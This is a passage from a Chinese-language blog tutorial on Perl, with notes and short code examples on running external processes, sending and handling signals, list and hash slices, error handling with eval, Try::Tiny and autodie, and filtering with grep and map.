class="hljs-keyword">die</span> <span class="hljs-string">&quot;date couldn&#x27;t run: $!&quot;</span>;<br></code></pre></td></tr></table></figure><h2 id="用反引号捕获输出结果"><a href="#用反引号捕获输出结果" class="headerlink" title="用反引号捕获输出结果"></a>用反引号捕获输出结果</h2><p>无论是 <code>system</code> 还是 <code>exec</code>, 所执行命令的输出都会送往 Perl 的标准输出.</p><p>可以用 “``“ 来捕获输出.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $now = <span class="hljs-string">`date`</span>;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;The time is now $now&quot;</span>;<br></code></pre></td></tr></table></figure><p>注意这里没有自动去除换行符. 反引号会以双引号内的字符串的方式解释, 即可以使用 Perl 中的变量.</p><p>除反引号外, 还可以使用引起操作符 <code>qx()</code>. 分隔符可换, 如用 <code>qx&#39;&#39;</code> 避免变量内插.</p><p>可将标准输入重定向到 <code>/dev/null</code> 来避免输入:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $result = <span class="hljs-string">`some_questionable_command arg arg argh &lt;/dev/null`</span>;<br></code></pre></td></tr></table></figure><h2 id="在列表上下文中使用反引号"><a href="#在列表上下文中使用反引号" class="headerlink" title="在列表上下文中使用反引号"></a>在列表上下文中使用反引号</h2><p>如果命令输出很多行, 那么标量上下文中使用反引号会得到一个很长的字符串, 其中包含换行符. 不过, 如果是在列表上下文使用同样的反引号, 则会输出字符串按行拆分的列表.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @who_lines = <span class="hljs-string">`who`</span>;<br></code></pre></td></tr></table></figure><p><code>@who_lines</code> 中有多个以换行符结尾的字符串.</p><h2 id="用-IPC-System-Simple-执行外部进程"><a href="#用-IPC-System-Simple-执行外部进程" class="headerlink" title="用 IPC::System::Simple 执行外部进程"></a>用 IPC::System::Simple 执行外部进程</h2><p>其需要从 CPAN 下载.</p><p>可直接使用该模块提供的同名函数取代内置的 <code>system</code> 函数, 但其可移植性更好.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> IPC::System::Simple <span class="hljs-string">qw(system)</span>;<br><br><span class="hljs-keyword">my</span> $tarfile = <span class="hljs-string">&#x27;something*wicked.tar&#x27;</span>;<br><span class="hljs-keyword">my</span> @dirs = <span class="hljs-string">qw(fred|flintstone &lt;barney&amp;rubble betty&gt;)</span>;<br><span class="hljs-keyword">system</span> <span class="hljs-string">&#x27;tar&#x27;</span>, <span class="hljs-string">&#x27;cvf&#x27;</span>, $tarfile, @dirs;<br></code></pre></td></tr></table></figure><p>提供的 <code>systemx</code> 函数在执行外部命令时不会通过 shell 调用.</p><p>捕获外部命令的输出, 使用 <code>capture</code> 或 <code>capturex</code>.</p><h2 id="通过文件句柄执行外部的进程"><a href="#通过文件句柄执行外部的进程" class="headerlink" title="通过文件句柄执行外部的进程"></a>通过文件句柄执行外部的进程</h2><p>并发式运行子进程, 将命令放在 <code>open</code> 调用道德文件名部分, 并且在它前面或后面加上竖线 (即管道符号), 两个参数的形式如下:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">open</span> DATE, <span class="hljs-string">&#x27;date|&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;cannot pipe from date: $!&quot;</span>;<br><span class="hljs-keyword">open</span> MAIL, <span class="hljs-string">&#x27;|mail merlyn&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;cannot pipe to mail: $!&quot;</span>;<br></code></pre></td></tr></table></figure><p><code>|</code> 在右边表示该命令的标准输出连接到 <code>DATE</code>.</p><p><code>|</code> 在左边表示该命令的标准输入连接到 <code>MAIL</code>.</p><p>三个参数的形式如下:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">open</span> <span class="hljs-keyword">my</span> $date_fh, <span class="hljs-string">&#x27;-|&#x27;</span>, <span class="hljs-string">&#x27;date&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;cannot pipe from date: $!&quot;</span>;<br><span class="hljs-keyword">open</span> <span class="hljs-keyword">my</span> $mail_fh, <span class="hljs-string">&#x27;|-&#x27;</span>, <span class="hljs-string">&#x27;mail merlyn&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;cannot pipe to mail: $!&quot;</span>;<br></code></pre></td></tr></table></figure><p><code>-</code> 的位置替代了原来的 <code>command</code>.</p><p>也可三个以上的参数:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">open</span> <span class="hljs-keyword">my</span> $mail_fh, <span class="hljs-string">&#x27;|-&#x27;</span>, <span class="hljs-string">&#x27;mail&#x27;</span>, <span class="hljs-string">&#x27; merlyn&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;cannot pipe to mail: $!&quot;</span>;<br></code></pre></td></tr></table></figure><p>从以读取模式打开的文件句柄中读取数据:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $now = &lt;$date_fh&gt;;<br></code></pre></td></tr></table></figure><p>发送数据到 mail 进程:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">print</span> $mail_fh <span class="hljs-string">&quot;The time is now $now&quot;</span>;<br></code></pre></td></tr></table></figure><p>结束:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">close</span> $mail_fh;<br><span class="hljs-keyword">die</span> <span class="hljs-string">&quot;mail: non-zero exit of $?&quot;</span> <span class="hljs-keyword">if</span> $?;<br></code></pre></td></tr></table></figure><p>退出状态保存在 <code>$?</code> 中.</p><h2 id="用-fork-进行深入和复杂工作"><a href="#用-fork-进行深入和复杂工作" class="headerlink" title="用 fork 进行深入和复杂工作"></a>用 fork 进行深入和复杂工作</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">system</span> <span class="hljs-string">&#x27;date&#x27;</span>;<br></code></pre></td></tr></table></figure><p>这条语句的低级实现:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">defined</span>(<span class="hljs-keyword">my</span> $pid = <span class="hljs-keyword">fork</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Cannot fork: $!&quot;</span>;<br><span class="hljs-keyword">unless</span> ($pid) &#123;<br>    <span class="hljs-keyword">exec</span> <span class="hljs-string">`date`</span>;<br>    <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;cannot exec date: $!&quot;</span>;<br>&#125;<br><span class="hljs-keyword">waitpid</span>($pid, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p><code>fork</code> 调用成功会返回一个 <code>pid</code>, 失败返回 <code>undef</code>.</p><p><code>waitpid</code> 用于等待特定的子进程结束.</p><p>深入了解可以查看 <code>perlipc</code> 文档.</p><h2 id="发送及接收信号"><a href="#发送及接收信号" class="headerlink" title="发送及接收信号"></a>发送及接收信号</h2><h3 id="发送信号"><a href="#发送信号" class="headerlink" title="发送信号"></a>发送信号</h3><p>在 Linux 中可以用 <code>kill -l</code> 列出所有的信号.</p><p>在 Perl 中使用 <code>kill</code> 发送信号:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">kill</span> <span class="hljs-number">2</span>, <span class="hljs-number">4200</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Cannot signal 4021 with SIGINT: $!&quot;</span>;<br></code></pre></td></tr></table></figure><p>这里的 <code>2</code> 是信号, 也可以用名称如 <code>INT</code>, <code>4022</code> 是 pid:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">kill</span> <span class="hljs-string">&#x27;INT&#x27;</span>, <span class="hljs-number">4200</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Cannot signal 4021 with SIGINT: $!&quot;</span>;<br></code></pre></td></tr></table></figure><p>可以使用 <code>=&gt;</code>, 这样信号名称不用被单引号包裹, 其会自动作为裸字符串:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">kill</span> <span class="hljs-string">INT =&gt;</span> <span class="hljs-number">4200</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Cannot signal 4021 with SIGINT: $!&quot;</span>;<br></code></pre></td></tr></table></figure><p>编号为 <code>0</code> 的特殊信号表示, 尝试是否能向这个进程发送信号. 可用于探测进程是否存活:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">unless</span> (<span class="hljs-keyword">kill</span> <span class="hljs-number">0</span>, $pid) &#123;<br>    <span class="hljs-keyword">warn</span> <span class="hljs-string">&quot;$pid has gone away&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="接收信号"><a href="#接收信号" class="headerlink" title="接收信号"></a>接收信号</h3><p>也就是处理向这个程序发送的信号.</p><p>对特殊哈希 <code>%SIG</code> 赋值会启动信号处理程序 (直到撤销为止). 哈希值是子程序名 (这里不加 <code>&amp;</code> 号). 如:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $temp_directory = <span class="hljs-string">&quot;/tmp/myprog.$$&quot;</span>;<br><span class="hljs-keyword">mkdir</span> $temp_directory, <span class="hljs-number">0700</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Cannot create $temp_directory&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">clean_up</span> </span>&#123;<br>    <span class="hljs-keyword">unlink</span> <span class="hljs-keyword">glob</span> <span class="hljs-string">&quot;$temp_directory/*&quot;</span>;<br>    <span class="hljs-keyword">rmdir</span> $temp_directory;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">my_int_handler</span> </span>&#123;<br>    &amp;clean_up();<br>    <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;interrupted, exiting...\n&quot;</span>;<br>&#125;<br><br>$SIG&#123;<span class="hljs-string">&#x27;INT&#x27;</span>&#125; = <span class="hljs-string">&#x27;my_int_handler&#x27;</span>;<br>.<br>.<br>.<br>&amp;clean_up;<br></code></pre></td></tr></table></figure><p>设置标记:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $int_count = <span class="hljs-number">0</span>;<br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">my_int_handler</span> </span>&#123; $int_count++ &#125;;<br>$SIG&#123;<span class="hljs-string">&#x27;INT&#x27;</span>&#125; = <span class="hljs-string">&#x27;my_int_handler&#x27;</span>;<br>...;<br><span class="hljs-keyword">while</span> (&lt;SOMEFILE) &#123;<br>    ...;<br>    <span class="hljs-keyword">if</span> ($int_count) &#123;<br>        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;[processing interrupted...]\n&quot;</span>;<br>        <span class="hljs-keyword">last</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="第十七章-高级-Perl-技巧"><a href="#第十七章-高级-Perl-技巧" class="headerlink" title="第十七章 高级 Perl 技巧"></a>第十七章 高级 Perl 技巧</h1><h2 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h2><p>列表切片, 就是可以用索引取得列表中的值 (把列表当作数组使用):</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $mtime = (<span class="hljs-keyword">stat</span> $some_file)[<span class="hljs-number">9</span>];<br></code></pre></td></tr></table></figure><p>这里的圆括号是必须的.</p><p>一次取一个值, 如:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $card_num = (<span class="hljs-keyword">split</span> <span class="hljs-regexp">/:/</span>)[<span class="hljs-number">1</span>];<br><span class="hljs-keyword">my</span> $count = (<span class="hljs-keyword">split</span> <span class="hljs-regexp">/:/</span>)[<span class="hljs-number">5</span>];<br></code></pre></td></tr></table></figure><p>一次取两个值, 如:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span>($card_num, $count) = (<span class="hljs-keyword">split</span> <span class="hljs-regexp">/:/</span>)[<span class="hljs-number">1</span>, <span class="hljs-number">5</span>];<br></code></pre></td></tr></table></figure><p>可以用 <code>-1</code> 代表最后一个元素.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @numbers = (@name)[<span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>];<br></code></pre></td></tr></table></figure><h3 id="数组切片-array-slice"><a href="#数组切片-array-slice" class="headerlink" title="数组切片 (array slice)"></a>数组切片 (array slice)</h3><p>从数组中切出元素时不需要圆括号, 上面改为:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @numbers = @name[<span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>];<br></code></pre></td></tr></table></figure><p>Perl 中 <code>$</code> 符号意味着一个东西, 而 <code>@</code> 符号意味着一组东西.</p><p>以 Perl 的习惯来看开头的符号和结尾的方括号, 方括号意味着你要检索数组成员, <code>@</code> 符号意味着获取整个列表, <code>$</code> 符号意味着取单个元素.</p><p>如果前面有个 <code>$</code> 符号, 下标表达式就会在标量上下文中求得索引值, 但如果之前有个 <code>@</code> 符号的话, 下表表达式就会在列表上下文中计算</p><p>切片可以直接内插到字符串中.</p><p>列表的元素会被 Perl 内置的 <code>$&quot;</code> 变量的内容填充, 而它的默认值就是空格, 一般不应改变. 内插时, Perl 实际上会执行 <code>join $&quot;,@list</code>.</p><p>修改数组中的元素:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $new_home_phone = <span class="hljs-string">&quot;555-6099&quot;</span>;<br><span class="hljs-keyword">my</span> $new_address = <span class="hljs-string">&quot;99380 Red Rock West&quot;</span>;<br>@items[<span class="hljs-number">2</span>, <span class="hljs-number">3</span>] = ($new_address, $new_home_phone);<br></code></pre></td></tr></table></figure><h3 id="哈希切片-hash-slice"><a href="#哈希切片-hash-slice" class="headerlink" title="哈希切片 (hash slice)"></a>哈希切片 (hash slice)</h3><p>切片一定是列表, 因此哈希切片也是用 <code>@</code> 符号来表示.</p><p>在 Perl 中看到类似 <code>@score&#123;...&#125;</code> 的写法, 用 Perl 的习惯来看就是, 花括号意味着你要检索哈希成员, <code>@</code> 符号意味着获取的是整个列表.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @three_scores = ($score&#123;<span class="hljs-string">&quot;barney&quot;</span>&#125;, $score&#123;<span class="hljs-string">&quot;fred&quot;</span>&#125;, $score&#123;<span class="hljs-string">&quot;dino&quot;</span>&#125;);<br><span class="hljs-keyword">my</span> @three_scores = @score&#123; <span class="hljs-keyword">qw</span>/barney fred dino/ &#125;;<br></code></pre></td></tr></table></figure><p>百分号符号表示的是整个哈希, 哈希切片一定是列表而不一定是整个哈希.</p><h2 id="捕获错误"><a href="#捕获错误" class="headerlink" title="捕获错误"></a>捕获错误</h2><p>可参阅 &lt;<Mastering Perl>&gt;</p><h3 id="使用-eval"><a href="#使用-eval" class="headerlink" title="使用 eval"></a>使用 eval</h3><p>把代码包裹在 <code>eval</code> 块中.</p><p><code>eval</code> 块只是一个表达式, 要在结尾加 <code>;</code></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">eval</span> &#123; $barney = $fred / $dino &#125;;<br></code></pre></td></tr></table></figure><p>只要 <code>eval</code> 发现在它的监察范围内出现致命错误, 就会立即停止运行整个块, 退出后继续运行其余代码.</p><p>和子程序相同, <code>eval</code> 的返回值是语句块中最后一条表达式的执行结果.</p><p>如果 <code>eval</code> 捕获到了错误, 那么整个语句块将返回 <code>undef</code>. 并且在特殊变量 <code>$@</code> 中设置错误消息.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> <span class="hljs-number">5.010</span>;<br><span class="hljs-keyword">my</span> $barney - <span class="hljs-keyword">eval</span> &#123; $fred / $dino &#125; // <span class="hljs-string">&#x27;NaN&#x27;</span>; <br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;I couldn&#x27;t divide by \$dino: $@&quot;</span> <span class="hljs-keyword">if</span> $@;<br></code></pre></td></tr></table></figure><p>可以构造一个有返回值的代码块:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">unless</span> ( <span class="hljs-keyword">eval</span> &#123; some_sub(); <span class="hljs-number">1</span> &#125; ) &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;I couldn&#x27;t divide by \$dino: $@&quot;</span> <span class="hljs-keyword">if</span> $@;<br>&#125;<br></code></pre></td></tr></table></figure><p>在列表上下文中, 捕获到错误的 <code>eval</code> 会返回空列表.</p><p><code>eval</code> 块可以设定 <code>my</code> 变量的新作用域, 块内的语句数目不限:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">foreach</span> <span class="hljs-keyword">my</span> $person (<span class="hljs-keyword">qw</span>/ fred wilma betty barney dino pebbles /) &#123;<br>    <span class="hljs-keyword">eval</span> &#123;<br>        <span class="hljs-keyword">open</span> <span class="hljs-keyword">my</span> $fh, <span class="hljs-string">&#x27;&lt;&#x27;</span>, $person<br>            <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Can&#x27;t open file &#x27;$person&#x27;: $!&quot;</span>;<br><br>        <span class="hljs-keyword">my</span>($total, $count);<br><br>        <span class="hljs-keyword">while</span> (&lt;$fh&gt;) &#123;<br>            $total += $_;<br>            $count++;<br>        &#125;<br><br>        <span class="hljs-keyword">my</span> $average = $total / $count;<br>        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Average for file $person was $average\n&quot;</span>;<br><br>        $do_something($person, $average);<br>    &#125;;<br><br>    <span class="hljs-keyword">if</span> ($@) &#123;<br>        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;An error occurred ($@), continuing\n&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以嵌套使用 <code>eval</code>, 内层的 <code>eval</code> 通过 <code>die</code> 向外层报告.</p><p>有 4 中类型的错误是 <code>eval</code> 无法捕获的:</p><ul><li>语法错误, 如忘写分号 <code>;</code> (perl 解释器的编译器会在解析源代码时捕获这类错误并在运行程序前停下来, 而 eval 仅仅能捕获 Perl 运行时出现的错误)</li><li>让 perl 解释器本身崩溃的错误, 如内存溢出 (其会让 perl 解释器意外终止)</li><li>无法捕获警告</li><li>用 <code>exit</code> 退出</li></ul><h2 id="更为高级的错误处理"><a href="#更为高级的错误处理" class="headerlink" title="更为高级的错误处理"></a>更为高级的错误处理</h2><p>用 <code>die</code> 抛出异常, 用 <code>eval</code> 捕获异常.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br><span class="hljs-keyword">local</span> $@;<br><br><span class="hljs-keyword">eval</span> &#123;<br>    ...;<br>    <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;An unexpected exception message&quot;</span> <span class="hljs-keyword">if</span> $unexpected;<br>    <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Bad denominator&quot;</span> <span class="hljs-keyword">if</span> $dino;<br>&#125;;<br><br><span class="hljs-keyword">if</span> ($@ =~ <span class="hljs-regexp">/unexpected/</span>) &#123;<br>    ...;<br>&#125; <span class="hljs-keyword">elsif</span> ($@ =~ <span class="hljs-regexp">/denominator/</span>) &#123;<br>    ...; <br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用 Try::Tiny 模块, 其不是内置模块:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Try::Tiny;<br><br>try &#123;<br>    ...; <span class="hljs-comment"># 可能会抛出异常的代码</span><br>&#125;<br>catch &#123;<br>    ...; <span class="hljs-comment"># 某些处理异常的代码</span><br>&#125;<br>finally &#123;<br>    ...;<br>&#125;<br></code></pre></td></tr></table></figure><p>可省略 <code>catch</code> 和 <code>finally</code> 块. 只用 <code>try</code> 来忽略错误:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $barney = try &#123;$fred / $dino&#125;;<br></code></pre></td></tr></table></figure><p>Try::Tiny 把错误消息放到了默认变量 <code>$_</code>.</p><h2 id="autodie"><a href="#autodie" class="headerlink" title="autodie"></a>autodie</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> autodie;<br><span class="hljs-keyword">open</span> <span class="hljs-keyword">my</span> $fh, <span class="hljs-string">&#x27;&gt;&#x27;</span>, $filename; <span class="hljs-comment"># 在发生错误时仍会调用 die 函数</span><br></code></pre></td></tr></table></figure><p><code>autodie</code> 模块默认会对一系列 Perl 内置的用于处理文件, 文件句柄, 进程间通信和套接字的函数自动施行监管, 也可以指定:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> autodie <span class="hljs-string">qw( open system :socket )</span>;<br></code></pre></td></tr></table></figure><p><code>autodie</code> 抛出错误时, 它会把一个 <code>autodie::exception</code> 对象放到 <code>$@</code> 变量中.</p><h2 id="用-grep-筛选列表"><a href="#用-grep-筛选列表" class="headerlink" title="用 grep 筛选列表"></a>用 grep 筛选列表</h2><p>如:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @odd_numbers = <span class="hljs-keyword">grep</span> &#123; $_ % <span class="hljs-number">2</span> &#125; <span class="hljs-number">1</span>..<span class="hljs-number">1000</span>;<br></code></pre></td></tr></table></figure><p><code>grep</code> 的第一个参数为一个代码块, 第二个为列表. <code>grep</code> 对列表中的每个元素计算出代码块的值. 代码块中的表达式返回真假值供 <code>grep</code> 判断.</p><p>在 <code>grep</code> 运行中 <code>$_</code> 会轮流成为列表中每个元素的别名.</p><p>从一个文件中取出包含 fred 的行:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @matching_lines = <span class="hljs-keyword">grep</span> <span class="hljs-regexp">/\bfred\b/i</span>, &lt;$fh&gt;;<br></code></pre></td></tr></table></figure><p><code>grep</code> 操作符在标量上下文中返回的是符合过滤条件的元素个数:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $line_count = <span class="hljs-keyword">grep</span> <span class="hljs-regexp">/\bfred\b/i</span>, &lt;$fh&gt;; <br></code></pre></td></tr></table></figure><h2 id="用-map-把列表元素变形"><a href="#用-map-把列表元素变形" class="headerlink" title="用 map 把列表元素变形"></a>用 map 把列表元素变形</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @data = (<span class="hljs-number">4.75</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1234</span>, <span class="hljs-number">6.9456</span>, <span class="hljs-number">12345678.9</span>, <span class="hljs-number">29.95</span>);<br><span class="hljs-keyword">my</span> @formatted_data = <span class="hljs-keyword">map</span> &#123; &amp;big_money($_) &#125; @data;<br></code></pre></td></tr></table></figure><p>和 <code>grep</code> 类似, 但其不返回真假值, 而是表达式实际的计算结果, 最终返回一系列这样的结果组成的列表.</p><p>事实上, 任何形式的 <code>grep</code> 或 <code>map</code> 语句都可以该写成 <code>foreach</code> 循环.</p><p>可以用简单的表达式和逗号而非一整个语句块:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Some powers of two are:\n&quot;</span>, <br>    <span class="hljs-keyword">map</span> <span class="hljs-string">&quot;t&quot;</span> . ( <span class="hljs-number">2</span> ** $_ ) . <span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-number">0</span>..<span class="hljs-number">15</span>;<br></code></pre></td></tr></table></figure><h2 id="更花哨的列表工具"><a href="#更花哨的列表工具" class="headerlink" title="更花哨的列表工具"></a>更花哨的列表工具</h2><p>Perl 中有一些模块专门用于列表数据的处理.</p><p>List::Util 模块包含在标准库中, 其用 C 语言实现.</p><p>如, 在找到第一个符合条件的元素时结束遍历, 返回结果, 使用 List::Util 提供的 <code>first</code> 子程序:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> List::Util <span class="hljs-string">qw(first)</span>;<br><span class="hljs-keyword">my</span> $first_match = first &#123; <span class="hljs-regexp">/\bPebbles\b/i</span> &#125; 